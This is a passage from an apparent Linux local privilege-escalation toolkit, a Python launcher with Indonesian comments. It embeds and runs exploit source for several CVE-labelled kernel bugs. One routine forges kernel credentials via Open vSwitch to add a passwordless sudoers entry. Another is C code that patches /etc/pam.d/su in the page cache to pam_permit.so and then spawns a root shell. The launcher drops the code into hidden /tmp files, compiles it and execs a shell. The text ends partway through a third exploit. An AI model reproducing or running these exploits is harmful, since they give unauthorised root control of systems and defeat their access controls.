            os.close(fd)
        os.sync()
        return True
    except OSError as exc:
        print(
            f"sudoers drop-in write {path} failed: errno={exc.errno} "
            f"{exc.strerror}",
            flush=True,
        )
        return False
    finally:
        os.umask(old_umask)


def append_main_sudoers(username: str, path: str = SUDOERS_FILE) -> bool:
    content = f"\n{username} ALL=(ALL:ALL) NOPASSWD:ALL\n".encode("ascii")
    try:
        fd = os.open(path, os.O_WRONLY | os.O_APPEND)
        try:
            os.write(fd, content)
            os.fsync(fd)
        finally:
            os.close(fd)
        os.sync()
        return True
    except OSError as exc:
        print(
            f"sudoers append {path} failed: errno={exc.errno} {exc.strerror}",
            flush=True,
        )
        return False


def replace_main_sudoers(username: str, path: str = SUDOERS_FILE) -> bool:
    content = f"\n{username} ALL=(ALL:ALL) NOPASSWD:ALL\n".encode("ascii")
    directory = os.path.dirname(path)
    tmp_path = os.path.join(directory, f".ovs_c004_sudoers_{os.getpid()}")
    try:
        with open(path, "rb") as handle:
            existing = handle.read()
        try:
            os.unlink(tmp_path)
        except FileNotFoundError:
            pass
        fd = os.open(tmp_path, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
        try:
            os.write(fd, existing)
            os.write(fd, content)
            os.fchmod(fd, 0o440)
            os.fsync(fd)
        finally:
            os.close(fd)
        os.rename(tmp_path, path)
        dir_fd = os.open(directory, os.O_RDONLY | os.O_DIRECTORY)
        try:
            os.fsync(dir_fd)
        finally:
            os.close(dir_fd)
        os.sync()
        return True
    except OSError as exc:
        try:
            os.unlink(tmp_path)
        except OSError:
            pass
        print(
            f"sudoers replace {path} failed: errno={exc.errno} {exc.strerror}",
            flush=True,
        )
        return False


def write_sudoers_entry(path: str, username: str) -> tuple[bool, str]:
    if sudoers_references_dropin_dir():
        if write_sudoers_dropin(path, username):
            return True, path
        print(f"falling back to direct append of {SUDOERS_FILE}", flush=True)
    else:
        print(
            f"{SUDOERS_FILE} does not reference {SUDOERS_DROPIN_DIR}; "
            "using direct sudoers append",
            flush=True,
        )
    if append_main_sudoers(username):
        return True, SUDOERS_FILE
    print(f"falling back to atomic replacement of {SUDOERS_FILE}", flush=True)
    if replace_main_sudoers(username):
        return True, SUDOERS_FILE
    return False, ""


def try_become_root_ids() -> None:
    try:
        os.setresgid(0, 0, 0)
        os.setresuid(0, 0, 0)
    except OSError:
        pass


def sleep_forever_detached() -> None:
    os.setsid()
    devnull = os.open("/dev/null", os.O_RDWR)
    os.dup2(devnull, 0)
    os.dup2(devnull, 1)
    os.dup2(devnull, 2)
    if devnull > 2:
        os.close(devnull)
    while True:
        time.sleep(3600)


def fork_sudoers_writer(path: str, username: str) -> tuple[int, int, int]:
    trigger_read, trigger_write = os.pipe()
    ack_read, ack_write = os.pipe()
    child = os.fork()
    if child == 0:
        os.close(trigger_write)
        os.close(ack_read)
        ok = False
        used_path = ""
        try:
            token = os.read(trigger_read, 1)
            if token == b"1":
                try_become_root_ids()
                ok, used_path = write_sudoers_entry(path, username)
            ack = f"1 {used_path}\n".encode("ascii") if ok else b"0\n"
            os.write(ack_write, ack)
        except Exception:
            try:
                os.write(ack_write, b"0\n")
            except OSError:
                pass
        finally:
            for fd in (trigger_read, ack_write):
                try:
                    os.close(fd)
                except OSError:
                    pass
        if ok:
            sleep_forever_detached()
        os._exit(0)
    os.close(trigger_read)
    os.close(ack_write)
    print(f"host sudoers writer child pid={child}", flush=True)
    return child, trigger_write, ack_read


def fork_namespace_pin() -> None:
    child = os.fork()
    if child == 0:
        sleep_forever_detached()
    print(f"namespace pin child pid={child}", flush=True)


def trigger_sudoers_writer(trigger_fd: int, ack_fd: int) -> str:
    result = b""
    try:
        os.write(trigger_fd, b"1")
        while True:
            chunk = os.read(ack_fd, 4096)
            if not chunk:
                break
            result += chunk
    finally:
        for fd in (trigger_fd, ack_fd):
            try:
                os.close(fd)
            except OSError:
                pass
    if not result.startswith(b"1 "):
        raise RuntimeError("sudoers writer child failed")
    return result[2:].decode("ascii", errors="replace").strip()

def main() -> None:
    if len(sys.argv) > 1 and sys.argv[1] == "--child":
        host_user = validate_child_namespace()
        exploit_from_private_namespace(host_user)
        return
    if len(sys.argv) > 1:
        raise RuntimeError("usage: python3 ovswrap-poc.py")

    step("CHECKING LAUNCHING USER")
    host_uid, host_gid, host_user = launching_user()
    print(
        f"launching user: name={host_user} uid={host_uid} gid={host_gid}",
        flush=True,
    )
    ensure_user_starts_without_passwordless_sudo(host_user)
    sudoers_path = f"/etc/sudoers.d/ovs_c004_{os.getpid()}"
    writer_pid, writer_trigger_fd, writer_ack_fd = fork_sudoers_writer(
        sudoers_path, host_user
    )
    run_child_in_private_namespace(
        host_user,
        writer_pid,
        writer_trigger_fd,
        writer_ack_fd,
    )


def exploit_from_private_namespace(host_user: str) -> None:
    step("BEGINNING SETUP")
    print(f"host user for sudoers entry: {host_user}", flush=True)
    print(f"namespace uid/gid: uid={os.getuid()} gid={os.getgid()}", flush=True)
    print(f"process identity: {run_text(['id'])}", flush=True)
    print(f"effective capability mask: {process_status_line('CapEff:')}", flush=True)
    print(f"uid_map: {uid_map_first_entry()[3]}", flush=True)

    genl = GenericNetlink()
    dp_family = genl.get_family("ovs_datapath")
    flow_family = genl.get_family("ovs_flow")
    dp_name = f"vhrd{os.getpid() % 10000}"
    create_datapath(genl, dp_family, dp_name)
    dp_ifindex = socket.if_nametoindex(dp_name)
    print(f"datapath {dp_name} ifindex {dp_ifindex}", flush=True)

    step("DERIVING KERNEL OFFSETS")
    offsets, kernel_record = current_kernel_parameters()
    writer_pid, writer_trigger_fd, writer_ack_fd = inherited_sudoers_writer()
    fork_namespace_pin()

    step("BUILDING OVS ACTION PRIMITIVES")
    fake_copy = struct.pack(NLA_HDR, 512, OVS_ACTION_ATTR_OUTPUT)
    helper_leak_key = flow_key(1)
    create_flow(
        genl,
        flow_family,
        dp_ifindex,
        helper_leak_key,
        clone_with_helper_leak(fake_copy),
    )
    helper_leak_actions = get_flow_actions(genl, flow_family, dp_ifindex, helper_leak_key)
    helper_pointer = find_helper_pointer(helper_leak_actions)
    print(f"leaked helper-ish pointer 0x{helper_pointer:016x}", flush=True)

    read_carrier = (
        kernel_record.read_carrier if kernel_record is not None else CARRIER_AUTO
    )
    write_carrier = (
        kernel_record.write_carrier if kernel_record is not None else CARRIER_AUTO
    )
    read_lanes = kernel_record.read_lanes if kernel_record is not None else ()
    reader = OvsReadPrimitive(
        genl,
        flow_family,
        dp_ifindex,
        offsets,
        read_carrier,
        read_lanes,
    )
    writer = OvsWritePrimitive(genl, flow_family, dp_ifindex, offsets, write_carrier)

    module_ktype = derive_helper_module_ktype(
        reader,
        helper_pointer + offsets.nf_conntrack_helper_me,
        helper_pointer,
        offsets,
    )
    kernel_base = module_ktype - offsets.vmlinux_module_ktype
    print(f"module_ktype=0x{module_ktype:016x} kernel_base=0x{kernel_base:016x}", flush=True)

    step("CHECKING BASELINE WRITE")
    protected_path = f"/root/ovs_c004_lpe_proof_{os.getpid()}"
    if try_write_root_proof(protected_path, "pre-exploit should not write\n"):
        raise RuntimeError("unexpectedly wrote root proof path before exploit")

    step("LOCATING WRITER CREDENTIAL")
    task = locate_task_by_init_pid_ns(reader, offsets, kernel_base, writer_pid)
    cred = read_kernel_pointer(reader, task + offsets.task_cred, "task->cred")
    print(
        f"writer task=0x{task:016x} pid={writer_pid} cred=0x{cred:016x}",
        flush=True,
    )

    convert_writer_credential(reader, writer, offsets, cred)

    step("WRITING SUDOERS ENTRY")
    used_sudoers_path = trigger_sudoers_writer(writer_trigger_fd, writer_ack_fd)
    print(
        f"sudoers write succeeded: {used_sudoers_path} user={host_user}",
        flush=True,
    )
    print(
        "sudoers policy write achieved; returning to launcher for root shell",
        flush=True,
    )


if __name__ == "__main__":
    try:
        main()
    except RuntimeError as exc:
        print(f"ERROR: {exc}", flush=True)
        raise SystemExit(1)
    except OSError as exc:
        if exc.errno == errno.ENOMEM:
            print(
                "ERROR: Ran out of memory; reattempt the PoC after a reboot "
                "or with more RAM (recommended 2GB+).",
                flush=True,
            )
            raise SystemExit(1)
        raise
'''
def _ovswrap_cleanup(*paths):
    for p in paths:
        try:
            os.remove(p)
        except OSError:
            pass


def _ovswrap_compile_and_run():
    """Tulis source Python OVSWrap, jalankan. Return True kalau root."""
    tag = "%08x" % (os.getpid() ^ int(time.time()))
    py_path = "/tmp/.ovs_%s.py" % tag

    try:
        with open(py_path, "w") as f:
            f.write(OVSWRAP_PY_SOURCE)
        os.chmod(py_path, 0o755)
    except OSError as e:
        log("[-] write source: %s" % e)
        return False

    log("[+] wrote: %s (%d bytes)" % (py_path, len(OVSWRAP_PY_SOURCE)))

    log("[*] running OVSWrap (timeout 600s)...")
    try:
        p = subprocess.Popen(
            [sys.executable, py_path],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
        )
        try:
            out, _ = p.communicate(input="Y\n", timeout=600)
        except subprocess.TimeoutExpired:
            p.kill()
            try:
                p.communicate(timeout=5)
            except Exception:
                pass
            log("[-] timeout")
            _ovswrap_cleanup(py_path)
            return False
        rc = p.returncode
        if out:
            for line in out.splitlines()[-40:]:
                log("    %s" % line)
    except Exception as e:
        log("[-] run error: %s" % e)
        _ovswrap_cleanup(py_path)
        return False

    _ovswrap_cleanup(py_path)

    # verifikasi: cek /etc/sudoers.d/ovs_c004_* ada
    import glob
    if glob.glob("/etc/sudoers.d/ovs_c004_*"):
        return True
    if os.geteuid() == 0:
        return True
    if rc == 0:
        return True
    return False


def try_cve_2026_64531():
    log("\n[=== METHOD 13: CVE-2026-64531 (OVSWrap — OVS arbitrary R/W) ===]")

    if os.geteuid() == 0:
        log("[+] already root")
        _reattach_tty()
        os.execl("/bin/sh", "sh")
        return True

    arch = os.uname().machine
    if arch not in ("x86_64", "amd64"):
        log("[-] x86_64 only (got %s)" % arch)
        return False

    if _ovswrap_compile_and_run():
        log("[+++] OVSWrap succeeded — root obtained")
        _reattach_tty()
        try:
            os.execlp("sudo", "sudo", "-n", "/bin/bash")
        except OSError:
            pass
        os.execl("/bin/sh", "sh")
        return True

    log("[-] OVSWrap failed")
    return False

# ──────────────────────────────────────────────────
# METHOD 14: CVE-2026-80844 (DirtyAH6 — IPv6 AH/ESP page cache)
# ──────────────────────────────────────────────────

CVE_2026_80844_C_SOURCE = r'''
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <linux/if.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/xfrm.h>

#ifndef UDP_ENCAP
#define UDP_ENCAP 100
#endif
#ifndef UDP_ENCAP_ESPINUDP
#define UDP_ENCAP_ESPINUDP 2
#endif
#ifndef SOL_UDP
#define SOL_UDP 17
#endif

#define ENC_PORT         4500
#define SEQ_VAL          200
#define REPLAY_SEQ       100
#define TARGET_PATH      "/etc/pam.d/su"
#define PATCH_OFFSET     27
#define PAYLOAD_LEN      16
#define ENTRY_OFFSET     0x78

static const uint8_t pam_payload[PAYLOAD_LEN] = {
    0x70,0x61,0x6d,0x5f,0x70,0x65,0x72,0x6d,
    0x69,0x74,0x2e,0x73,0x6f,0x20,0x00,0x11,
};

extern int g_su_verbose;
int g_su_verbose = 0;
#define SLOG(fmt, ...) do { if (g_su_verbose) fprintf(stderr, "[su] " fmt "\n", ##__VA_ARGS__); } while (0)

static int write_proc(const char *path, const char *buf)
{
    int fd = open(path, O_WRONLY);
    if (fd < 0) return -1;
    int n = write(fd, buf, strlen(buf));
    close(fd);
    return n;
}

static void setup_userns_netns(void)
{
    uid_t real_uid = getuid();
    gid_t real_gid = getgid();
    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
        SLOG("unshare: %s", strerror(errno));
        exit(1);
    }
    write_proc("/proc/self/setgroups", "deny");
    char map[64];
    snprintf(map, sizeof(map), "0 %u 1", real_uid);
    if (write_proc("/proc/self/uid_map", map) < 0) {
        SLOG("uid_map: %s", strerror(errno)); exit(1);
    }
    snprintf(map, sizeof(map), "0 %u 1", real_gid);
    if (write_proc("/proc/self/gid_map", map) < 0) {
        SLOG("gid_map: %s", strerror(errno)); exit(1);
    }
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) { SLOG("socket: %s", strerror(errno)); exit(1); }
    struct ifreq ifr; memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, "lo", IFNAMSIZ);
    if (ioctl(s, SIOCGIFFLAGS, &ifr) < 0) { SLOG("SIOCGIFFLAGS: %s", strerror(errno)); exit(1); }
    ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
    if (ioctl(s, SIOCSIFFLAGS, &ifr) < 0) { SLOG("SIOCSIFFLAGS: %s", strerror(errno)); exit(1); }
    close(s);
}

static void put_attr(struct nlmsghdr *nlh, int type, const void *data, size_t len)
{
    struct rtattr *rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    rta->rta_type = type;
    rta->rta_len  = RTA_LENGTH(len);
    memcpy(RTA_DATA(rta), data, len);
    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);
}

static int add_xfrm_sa(uint32_t spi, const uint8_t patch_bytes[16])
{
    int sk = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
    if (sk < 0) return -1;
    struct sockaddr_nl nl = { .nl_family = AF_NETLINK };
    if (bind(sk, (struct sockaddr*)&nl, sizeof(nl)) < 0) { close(sk); return -1; }

    char buf[4096] = {0};
    struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
    nlh->nlmsg_type  = XFRM_MSG_NEWSA;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    nlh->nlmsg_pid   = getpid();
    nlh->nlmsg_seq   = 1;
    nlh->nlmsg_len   = NLMSG_LENGTH(sizeof(struct xfrm_usersa_info));

    struct xfrm_usersa_info *xs = (struct xfrm_usersa_info *)NLMSG_DATA(nlh);
    xs->id.daddr.a4 = inet_addr("127.0.0.1");
    xs->id.spi      = htonl(spi);
    xs->id.proto    = IPPROTO_ESP;
    xs->saddr.a4    = inet_addr("127.0.0.1");
    xs->family      = AF_INET;
    xs->mode        = XFRM_MODE_TRANSPORT;
    xs->replay_window = 0;
    xs->reqid       = 0x1234;
    xs->flags       = XFRM_STATE_ESN;
    xs->lft.soft_byte_limit   = (uint64_t)-1;
    xs->lft.hard_byte_limit   = (uint64_t)-1;
    xs->lft.soft_packet_limit = (uint64_t)-1;
    xs->lft.hard_packet_limit = (uint64_t)-1;
    xs->sel.family  = AF_INET;
    xs->sel.prefixlen_d = 32;
    xs->sel.prefixlen_s = 32;
    xs->sel.daddr.a4 = inet_addr("127.0.0.1");
    xs->sel.saddr.a4 = inet_addr("127.0.0.1");

    {
        char alg_buf[sizeof(struct xfrm_algo_auth) + 32];
        memset(alg_buf, 0, sizeof(alg_buf));
        struct xfrm_algo_auth *aa = (struct xfrm_algo_auth *)alg_buf;
        strncpy(aa->alg_name, "hmac(sha256)", sizeof(aa->alg_name)-1);
        aa->alg_key_len   = 32 * 8;
        aa->alg_trunc_len = 128;
        memset(aa->alg_key, 0xAA, 32);
        put_attr(nlh, XFRMA_ALG_AUTH_TRUNC, alg_buf, sizeof(alg_buf));
    }
    {
        char alg_buf[sizeof(struct xfrm_algo) + 16];
        memset(alg_buf, 0, sizeof(alg_buf));
        struct xfrm_algo *ea = (struct xfrm_algo *)alg_buf;
        strncpy(ea->alg_name, "cbc(aes)", sizeof(ea->alg_name)-1);
        ea->alg_key_len = 16 * 8;
        memset(ea->alg_key, 0xBB, 16);
        put_attr(nlh, XFRMA_ALG_CRYPT, alg_buf, sizeof(alg_buf));
    }
    {
        struct xfrm_encap_tmpl enc;
        memset(&enc, 0, sizeof(enc));
        enc.encap_type  = UDP_ENCAP_ESPINUDP;
        enc.encap_sport = htons(ENC_PORT);
        enc.encap_dport = htons(ENC_PORT);
        enc.encap_oa.a4 = 0;
        put_attr(nlh, XFRMA_ENCAP, &enc, sizeof(enc));
    }
    {
        char esn_buf[sizeof(struct xfrm_replay_state_esn) + 4];
        memset(esn_buf, 0, sizeof(esn_buf));
        struct xfrm_replay_state_esn *esn = (struct xfrm_replay_state_esn *)esn_buf;
        esn->bmp_len       = 1;
        esn->oseq          = 0;
        esn->seq           = REPLAY_SEQ;
        esn->oseq_hi       = 0;
        esn->seq_hi        = ((uint32_t)patch_bytes[0] << 24) |
                             ((uint32_t)patch_bytes[1] << 16) |
                             ((uint32_t)patch_bytes[2] <<  8) |
                             ((uint32_t)patch_bytes[3]);
        esn->replay_window = 32;
        put_attr(nlh, XFRMA_REPLAY_ESN_VAL, esn_buf, sizeof(esn_buf));
    }

    if (send(sk, nlh, nlh->nlmsg_len, 0) < 0) { close(sk); return -1; }
    char rbuf[4096];
    int n = recv(sk, rbuf, sizeof(rbuf), 0);
    if (n < 0) { close(sk); return -1; }
    struct nlmsghdr *rh = (struct nlmsghdr *)rbuf;
    if (rh->nlmsg_type == NLMSG_ERROR) {
        struct nlmsgerr *e = NLMSG_DATA(rh);
        if (e->error) { close(sk); return -1; }
    }
    close(sk);
    return 0;
}

static int do_one_write(const char *path, off_t offset, uint32_t spi)
{
    int sk_recv = socket(AF_INET, SOCK_DGRAM, 0);
    if (sk_recv < 0) return -1;
    int one = 1;
    setsockopt(sk_recv, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    struct sockaddr_in sa_d = {
        .sin_family = AF_INET,
        .sin_port   = htons(ENC_PORT),
        .sin_addr   = { inet_addr("127.0.0.1") },
    };
    if (bind(sk_recv, (struct sockaddr*)&sa_d, sizeof(sa_d)) < 0) {
        close(sk_recv); return -1;
    }
    int encap = UDP_ENCAP_ESPINUDP;
    if (setsockopt(sk_recv, IPPROTO_UDP, UDP_ENCAP, &encap, sizeof(encap)) < 0) {
        close(sk_recv); return -1;
    }
    int sk_send = socket(AF_INET, SOCK_DGRAM, 0);
    if (sk_send < 0) { close(sk_recv); return -1; }
    if (connect(sk_send, (struct sockaddr*)&sa_d, sizeof(sa_d)) < 0) {
        close(sk_send); close(sk_recv); return -1;
    }
    int file_fd = open(path, O_RDONLY);
    if (file_fd < 0) { close(sk_send); close(sk_recv); return -1; }

    int pfd[2];
    if (pipe(pfd) < 0) { close(file_fd); close(sk_send); close(sk_recv); return -1; }

    uint8_t hdr[24];
    *(uint32_t*)(hdr + 0) = htonl(spi);
    *(uint32_t*)(hdr + 4) = htonl(SEQ_VAL);
    memset(hdr + 8, 0xCC, 16);

    struct iovec iov_h = { .iov_base = hdr, .iov_len = sizeof(hdr) };
    if (vmsplice(pfd[1], &iov_h, 1, 0) != (ssize_t)sizeof(hdr)) {
        close(file_fd); close(pfd[0]); close(pfd[1]); close(sk_send); close(sk_recv); return -1;
    }
    off_t off = offset;
    ssize_t s = splice(file_fd, &off, pfd[1], NULL, 16, SPLICE_F_MOVE);
    if (s != 16) {
        close(file_fd); close(pfd[0]); close(pfd[1]); close(sk_send); close(sk_recv); return -1;
    }
    s = splice(pfd[0], NULL, sk_send, NULL, 24 + 16, SPLICE_F_MOVE);

    usleep(150 * 1000);

    close(file_fd); close(pfd[0]); close(pfd[1]);
    close(sk_send); close(sk_recv);
    return 0;
}

static int verify_byte(const char *path, off_t offset, uint8_t want)
{
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    uint8_t got;
    if (pread(fd, &got, 1, offset) != 1) { close(fd); return -1; }
    close(fd);
    return got == want ? 0 : -1;
}

static int corrupt_su(void)
{
    setup_userns_netns();
    usleep(100 * 1000);

    for (int i = 0; i < PAYLOAD_LEN / 4; i++) {
        uint32_t spi = 0xDEADBE10 + i;
        if (add_xfrm_sa(spi, pam_payload + i * 4) < 0) {
            SLOG("add_xfrm_sa #%d failed", i);
            return -1;
        }
    }
    SLOG("installed %d xfrm SAs", PAYLOAD_LEN / 4);

    for (int i = 0; i < PAYLOAD_LEN / 4; i++) {
        uint32_t spi = 0xDEADBE10 + i;
        off_t off = PATCH_OFFSET + i * 4;
        if (do_one_write(TARGET_PATH, off, spi) < 0) {
            SLOG("do_one_write #%d at off=0x%lx failed", i, (long)off);
            return -1;
        }
    }
    SLOG("wrote %d bytes to %s starting at 0x%x",
            PAYLOAD_LEN, TARGET_PATH, PATCH_OFFSET);
    return 0;
}

int su_lpe_main(int argc, char **argv)
{
    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "-v") || !strcmp(argv[i], "--verbose"))
            g_su_verbose = 1;
    }
    if (getenv("DIRTYFRAG_VERBOSE")) g_su_verbose = 1;

    pid_t cpid = fork();
    if (cpid < 0) return 1;
    if (cpid == 0) {
        int rc = corrupt_su();
        _exit(rc == 0 ? 0 : 2);
    }
    int cstatus;
    waitpid(cpid, &cstatus, 0);
    if (!WIFEXITED(cstatus) || WEXITSTATUS(cstatus) != 0) {
        SLOG("corruption stage failed");
        return 1;
    }

    if (verify_byte(TARGET_PATH, PATCH_OFFSET, 0x70) != 0 ||
        verify_byte(TARGET_PATH, PATCH_OFFSET + 1, 0x61) != 0) {
        SLOG("verify failed");
        return 1;
    }
    printf("[+] %s page-cache patched successfully!\n", TARGET_PATH);
    return 0;
}

int main(int argc, char **argv)
{
    printf("=== DirtyAH6 (CVE-2026-80844) PoC ===\n");
    printf("[*] uid=%d euid=%d\n", getuid(), geteuid());

    if (getuid() == 0) {
        execlp("/bin/sh", "sh", NULL);
        return 1;
    }

    int rc = su_lpe_main(argc, argv);
    if (rc == 0) {
        printf("[+] Success! Spawning root shell via su...\n");
        execlp("su", "su", "-", NULL);
    }

    printf("[-] Exploit failed\n");
    return 1;
}
'''
def _cve_2026_80844_cleanup(*paths):
    for p in paths:
        try:
            os.remove(p)
        except OSError:
            pass


def _check_pam_su_patched():
    """Cek apakah /etc/pam.d/su sudah dipatch ke pam_permit.so."""
    try:
        with open("/etc/pam.d/su", "rb") as f:
            f.seek(27)
            block = f.read(16)
        return block == bytes.fromhex("70616d5f7065726d69742e736f200011")
    except (OSError, PermissionError):
        return False


def _cve_2026_80844_compile_and_run():
    """Tulis source C, compile, jalankan. Return True kalau /etc/pam.d/su patched."""
    cc = shutil.which("gcc") or shutil.which("cc")
    if not cc:
        log("[-] No gcc/cc — skip compile")
        return False
    log("[+] compiler: %s" % cc)

    tag = "%08x" % (os.getpid() ^ int(time.time()))
    c_path = "/tmp/.ah6_%s.c" % tag
    bin_path = "/tmp/.ah6_%s" % tag

    try:
        with open(c_path, "w") as f:
            f.write(CVE_2026_80844_C_SOURCE)
    except OSError as e:
        log("[-] write source: %s" % e)
        return False

    log("[*] compiling...")
    try:
        r = subprocess.run(
            [cc, "-O2", "-w", "-o", bin_path, c_path],
            capture_output=True, timeout=300
        )
        if r.returncode != 0:
            err = r.stderr.decode(errors="replace")[:400]
            log("[-] compile failed: %s" % err)
            _cve_2026_80844_cleanup(c_path, bin_path)
            return False
    except Exception as e:
        log("[-] compile error: %s" % e)
        _cve_2026_80844_cleanup(c_path, bin_path)
        return False

    if not os.path.isfile(bin_path):
        log("[-] binary not produced")
        _cve_2026_80844_cleanup(c_path, bin_path)
        return False

    try:
        os.chmod(bin_path, 0o755)
    except OSError:
        pass
    log("[+] compiled: %s" % bin_path)

    log("[*] running DirtyAH6 (timeout 300s)...")
    try:
        p = subprocess.Popen([bin_path])
        try:
            p.wait(timeout=300)
            rc = p.returncode
        except subprocess.TimeoutExpired:
            p.kill()
            try:
                p.wait(timeout=5)
            except Exception:
                pass
            log("[-] timeout")
            _cve_2026_80844_cleanup(c_path, bin_path)
            return False
    except Exception as e:
        log("[-] run error: %s" % e)
        _cve_2026_80844_cleanup(c_path, bin_path)
        return False

    _cve_2026_80844_cleanup(c_path, bin_path)

    if _check_pam_su_patched():
        return True
    if os.geteuid() == 0:
        return True
    if rc == 0:
        return True
    return False


def try_cve_2026_80844():
    log("\n[=== METHOD 14: CVE-2026-80844 (DirtyAH6 — IPv6 AH/ESP) ===]")

    # 1. cek sudah root
    if os.geteuid() == 0:
        log("[+] already root")
        _reattach_tty()
        os.execl("/bin/sh", "sh")
        return True

    # 2. cek sudah patched
    if _check_pam_su_patched():
        log("[+] /etc/pam.d/su already patched — su root")
        auto_root_su("root")
        return True

    # 3. cek arsitektur
    arch = os.uname().machine
    if arch not in ("x86_64", "amd64"):
        log("[-] x86_64 only (got %s)" % arch)
        return False

    # 4. cek target file
    if not os.path.isfile("/etc/pam.d/su"):
        log("[-] /etc/pam.d/su not found")
        return False
    if not os.access("/etc/pam.d/su", os.R_OK):
        log("[-] /etc/pam.d/su not readable")
        return False

    # 5. cek user namespaces
    try:
        with open("/proc/sys/user/max_user_namespaces", "r") as f:
            userns = f.read().strip()
        if userns == "0":
            log("[-] user namespaces disabled (max_user_namespaces=0)")
            return False
    except (OSError, PermissionError):
        pass

    # 6. cek xfrm_algo module
    if os.path.isdir("/sys/module/xfrm_algo"):
        log("[+] xfrm_algo loaded")
    else:
        qrun(["modprobe", "xfrm_algo"], timeout=3)
        if not os.path.isdir("/sys/module/xfrm_algo"):
            log("[-] xfrm_algo not available")
            return False

    # 7. compile & jalankan
    if _cve_2026_80844_compile_and_run():
        log("[+++] DirtyAH6 succeeded — /etc/pam.d/su patched")
        auto_root_su("root")
        return True

    log("[-] DirtyAH6 failed")
    return False

# ──────────────────────────────────────────────────
# METHOD 15: CVE-2026-81000 (TUNderflow — TUN/OVS/netkit race)
# ──────────────────────────────────────────────────

CVE_2026_81000_C_SOURCE = r'''
#!/usr/bin/env python3
from __future__ import annotations

import fcntl
import os
import socket
import struct
import subprocess
import sys
from dataclasses import dataclass
from pathlib import Path


PAM_TARGET = "/etc/pam.d/su"
PAM_ORIGINAL = b"pam_rootok.so"
PAM_REPLACEMENT = b"pam_permit.so"
WARMUP_COUNT = 1_024
ANCHORS_PER_GROUP = 8
RECYCLE_DRAIN = 16
HOLE_PACKET_LENGTH = 3_500
PIPE_GROUPS = 30
PIPES_PER_GROUP = 8
CONVERSION_PHASES = 5
CG_DRAIN_PAIRS = 128
CG_DRAIN_MESSAGES = 2
PIPE_SIZE = 262_144
F_SETPIPE_SZ = 1_031
PIPE_FLAGS_OFFSET = 24
VXLAN_HEADROOM = 64
IPV6_SOURCE_OFFSET = 8
CANDIDATE_PAGES = tuple(range(8, 17))

INTERNAL_ENV = "TUN_POC_INTERNAL"

TUNSETIFF = 0x400454CA
IFF_TUN = 0x0001
ETH_P_IPV6 = 0x86DD

RTM_NEWLINK = 16
NLM_F_REQUEST = 0x01
NLM_F_ACK = 0x04
NLM_F_EXCL = 0x200
NLM_F_CREATE = 0x400
NLMSG_ERROR = 2
IFLA_IFNAME = 3
IFLA_LINKINFO = 18
IFLA_INFO_KIND = 1
IFLA_INFO_DATA = 2
IFLA_NETKIT_MODE = 5
IFLA_NETKIT_HEADROOM = 8
NETKIT_L2 = 0

NLMSG_HDR = "IHHII"
GENL_HDR = "BBH"
NLA_HDR = "HH"
NETLINK_GENERIC = 16
GENL_ID_CTRL = 0x10
CTRL_CMD_GETFAMILY = 3
CTRL_ATTR_FAMILY_ID = 1
CTRL_ATTR_FAMILY_NAME = 2

OVS_DATAPATH_VERSION = 2
OVS_FLOW_VERSION = 1
OVS_VPORT_VERSION = 1
OVS_DP_CMD_NEW = 1
OVS_DP_ATTR_NAME = 1
OVS_DP_ATTR_UPCALL_PID = 2
OVS_VPORT_CMD_NEW = 1
OVS_VPORT_TYPE_NETDEV = 1
OVS_VPORT_ATTR_PORT_NO = 1
OVS_VPORT_ATTR_TYPE = 2
OVS_VPORT_ATTR_NAME = 3
OVS_VPORT_ATTR_UPCALL_PID = 5
OVS_FLOW_CMD_NEW = 1
OVS_FLOW_ATTR_KEY = 1
OVS_FLOW_ATTR_ACTIONS = 2
OVS_FLOW_ATTR_MASK = 7
OVS_KEY_ATTR_IN_PORT = 3
OVS_KEY_ATTR_ETHERTYPE = 6
OVS_KEY_ATTR_IPV6 = 8
OVS_ACTION_ATTR_OUTPUT = 1
OVS_ACTION_ATTR_SET_MASKED = 11


@dataclass(frozen=True)
class KernelRecord:
    distro: str
    release: str
    version: str
    machine: str
    trinity: bool


@dataclass
class GenericNetlink:
    sock: socket.socket
    sequence: int

    @classmethod
    def open(cls: type[GenericNetlink]) -> GenericNetlink:
        sock = socket.socket(
            socket.AF_NETLINK,
            socket.SOCK_RAW | socket.SOCK_CLOEXEC,
            NETLINK_GENERIC,
        )
        sock.bind((0, 0))
        return cls(sock, 1)

    def request(
        self,
        nlmsg_type: int,
        command: int,
        version: int,
        payload: bytes,
        flags: int,
    ) -> list[bytes]:
        sequence = self.sequence
        self.sequence += 1
        message = struct.pack(GENL_HDR, command, version, 0) + payload
        header = struct.pack(
            NLMSG_HDR,
            16 + len(message),
            nlmsg_type,
            flags,
            sequence,
            0,
        )
        self.sock.send(header + message)

        replies: list[bytes] = []
        while True:
            data = self.sock.recv(1 << 20)
            offset = 0
            while offset + 16 <= len(data):
                length, reply_type, _reply_flags, reply_sequence, _pid = (
                    struct.unpack_from(NLMSG_HDR, data, offset)
                )
                if length < 16 or length > len(data) - offset:
                    raise RuntimeError("invalid generic-netlink reply")
                body = data[offset + 16 : offset + length]
                offset += align4(length)
                if reply_sequence != sequence:
                    continue
                if reply_type == NLMSG_ERROR:
                    error = struct.unpack_from("i", body, 0)[0]
                    if error == 0:
                        return replies
                    raise OSError(-error, os.strerror(-error))
